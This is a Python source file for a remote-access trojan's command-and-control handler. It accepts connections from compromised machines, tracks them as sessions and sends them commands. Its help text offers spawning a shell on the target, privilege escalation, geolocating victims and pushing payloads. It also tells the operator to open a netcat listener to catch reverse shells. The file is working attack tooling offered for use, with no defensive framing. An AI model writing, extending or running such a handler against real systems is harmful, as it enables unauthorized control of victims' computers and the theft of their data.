"""imports"""
import json
import os
import sys
import traceback
from subprocess import run
from threading import Thread
from socket import socket, AF_INET, SOCK_STREAM
from _socket import SO_REUSEADDR, SOL_SOCKET
from time import sleep
from prompt_toolkit import prompt

input = prompt

# webserver tracker
n = 0
# lets get the variables


def clear():
    run(['clear'])


cwd = os.getcwd()
with open(".data/data.json") as file:
    variableDict = json.load(file)
    file.close()

"""global variables"""
host = "0.0.0.0" if input(f'Do you what to listen on all interfaces: ').startswith("y") else variableDict["L_HOST"]
port = int(variableDict["L_PORT"])

server = socket(AF_INET, SOCK_STREAM)
server.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
server.bind((host, port))
server.listen()

"""For connection tracking"""
clients = []
clientIds = []


class CustomImportedFunctions:
    def __init__(self):
        pass

    @staticmethod
    def mainHelp():
        input('''
Help Section For Handler
    start: start handler server
    show: shows connected sessions
    use: selects a connected session
        [Usage]:
            use [index of connection in list]
    webserver: starts the webserver for encrypted payloads
    Press enter to return: ''')
    @staticmethod
    def sessionHelp(*args) -> None:
        input("""Showing help for session handler
Commands
    check     - See if the device is still active
    shell     - Spawn a shell on the target device
    priv      - Get effective user ID of session
    escalate  - Attempt to escalate privileges "no exploit uses sudo just to test"
    locate    - Geographically locate using https://ipinfo.io/
    payload   - Send what ever is stored in the payload value
    close     - Close session and return to handler menu
    back      - Return to handler menu

Press enter to continue""")
        return

    @staticmethod
    def shell(client):
        try:
            input("open a terminal and type --> nc -nvlp 9997 then press enter")
            client.send(b"shell")
        except Exception:
            print(traceback.format_exc())
            return False

    @staticmethod
    def run(client):
        try:
            client.send(b"cmd")
            data = input("enter command to be sent").encode()
            client.send(data)
            return True
        except Exception:
            print(traceback.format_exc())
            return False

try:
    class Network:

        def use(self):
            """Reconnect to a device that has been stored"""
            try:
                inputs = ["help", "shell"]
                functs = [CustomImportedFunctions.sessionHelp, CustomImportedFunctions.shell]
                # device index is passed by parent method
                device = int(self.string)
                print(self.string)
                # set a variable linked to the device that what's to be used;
                a = clients[device]

                while True:
                    # here we sleep to allow the device on the other side to finish the previous
                    sleep(2)
                    data = input(f'Sessions on {clientIds[int(self.string)]}: ')
                    if data in inputs:
                        functs[inputs.index(data)](a)
            except Exception as e:
                print(e)

        @classmethod
        def show(cls):
            n = 0
            run(["clear"])
            print('Socket connections')
            for a in clients:
                print(f"{n}: {a}\n")
                n += 1
            print('\n\nAddresses')
            n = 0
            for b in clientIds:
                print(f'{n}: {b}\n')
                n += 1

        @classmethod
        def broadcast(cls, message):
            for client in clients:
                try:
                    client.send(message)
                except OSError as e:
                    print(f'[!] Error when connection to {clientIds[clients.index(client)]}.\n   [Error Report]\n{e}')
                    return False
            return True

        @classmethod
        def handle(cls, client):
            if client in clients:
                if client.recv(1024) == b'200':
                    try:
                        client.send(b'200')
                        return True
                    except OSError:
                        return False
            return True

        @classmethod
        def __inback__(cls):
            try:
                client, clientAddress = server.accept()
                print(f'\n[!] Connected to {str(clientAddress[0])}')
                clientIds.append(clientAddress[0])
                clients.append(client)
                thread = Thread(target=cls.handle, args=(client,))
                thread.start()
                return True
            except OSError as e:
                print(e)
                return False

        @classmethod
        def receive(cls):
            print(f'[*] Server started on port {variableDict["L_PORT"]}.')
            while True:
                try:
                    if cls.__inback__():
                        continue
                except OSError as e:
                    print(e)
                    return True

        def setVals(self, val):
            self.string = val


    def mainMenu():
        while True:
            try:
                inputs = ['start', 'show', 'use', 'clear', 'help']
                functions = [Network.receive, Network.show, Network.use, clear, CustomImportedFunctions.mainHelp]
                a = input('[Handler]: ')
                if "use" in a:
                    aa = Network()
                    aa.setVals(a.split(" ")[1])
                    aa.use()
                data = a
                for x in inputs:
                    if data == x:
                        funIndex = inputs.index(x)
                        if funIndex == 0:
                            a = Thread(target=Network.receive)
                            a.start()
                            data = None
                            a = None
                            continue
                        else:
                            for x in inputs:
                                if data in x:
                                    functions[inputs.index(x)]()
                                    continue
                    else:
                        continue
                continue
            except Exception as e:
                print(e)


    mainMenu()
except Exception as e:
    input(str(e))
    server.close()
    sys.exit()

